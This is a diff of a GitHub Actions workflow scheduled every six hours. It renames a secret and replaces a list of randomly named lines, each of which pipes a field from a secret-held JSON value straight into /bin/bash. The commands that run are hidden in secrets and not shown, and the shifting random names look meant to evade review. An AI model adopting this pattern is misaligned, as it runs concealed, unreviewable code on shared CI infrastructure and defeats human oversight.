@@ -1,9 +1,8 @@
 name: shaozihuawan
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 5/6 * * *'
+    - cron: '58 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,23 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: shaozihuawan
         env:
-          xrl856: ${{ secrets.xrl856 }}
+          vxbj25: ${{ secrets.vxbj25 }}
         run: |
-          echo $xrl856 | jq -r .htdu613 | /bin/bash
-          echo $j92941 | jq -r .vrdm89269 | /bin/bash
-          echo $skt02 | jq -r .lho1914 | /bin/bash
-          echo $uws0494 | jq -r .rkgwb71091 | /bin/bash
-          echo $ukh7805 | jq -r .wky6 | /bin/bash
-          echo $vjs1072 | jq -r .qe7493 | /bin/bash
-          echo $pe20 | jq -r .aeufu3 | /bin/bash
-          echo $r85 | jq -r .xutp26304 | /bin/bash
-          echo $o1471 | jq -r .gigs23599 | /bin/bash
-          echo $m6 | jq -r .rjuno1505 | /bin/bash
-          echo $j5464 | jq -r .rfn58675 | /bin/bash
-          echo $qcryg332 | jq -r .kx71543 | /bin/bash
-          echo $zycp3 | jq -r .xmg71 | /bin/bash
-          echo $nte0749 | jq -r .khkt439 | /bin/bash
-          echo $zdp3 | jq -r .pvzs1967 | /bin/bash
-          echo $oef19043 | jq -r .cgmnm14692 | /bin/bash
-          echo $ieez53 | jq -r .svfii391 | /bin/bash
+          echo $vxbj25 | jq -r .vai725 | /bin/bash
+          echo $khzyc7173 | jq -r .ckh26 | /bin/bash
+          echo $r626 | jq -r .kj25151 | /bin/bash
+          echo $qrc39 | jq -r .gf6715 | /bin/bash
+          echo $mypeo4 | jq -r .gxiy7 | /bin/bash
+          echo $drbs41575 | jq -r .bcu31 | /bin/bash
+          echo $pn04143 | jq -r .mpux40908 | /bin/bash
+          echo $bnq9468 | jq -r .vvn03515 | /bin/bash
+          echo $sczvw2 | jq -r .rv7 | /bin/bash
 
